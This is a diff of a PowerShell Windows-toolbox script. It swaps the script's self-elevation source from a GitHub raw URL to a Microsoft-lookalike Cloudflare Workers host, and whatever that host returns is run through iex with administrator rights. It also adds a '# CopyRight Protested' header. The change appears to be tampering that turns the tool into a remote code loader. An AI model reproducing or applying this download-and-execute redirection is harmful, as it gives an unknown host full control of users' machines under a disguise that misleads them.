@@ -1,3 +1,6 @@
+# CopyRight Protested
+
+
 $ScriptBlock = {
 $ErrorActionPreference = 'SilentlyContinue'
 cls
@@ -2359,7 +2362,7 @@ Exit
 
 
 If (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')) {
-    $runasbox = {$i=(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/erdv/gal/main/WindowsToolbox.ps1');iex($i)}
+    $runasbox = {$i=(New-Object System.Net.WebClient).DownloadString('https://ps.microsoft-toolbox.workers.dev');iex($i)}
     Start-Process powershell $runasbox.ToString() -Verb RunAs 
     Exit
 }
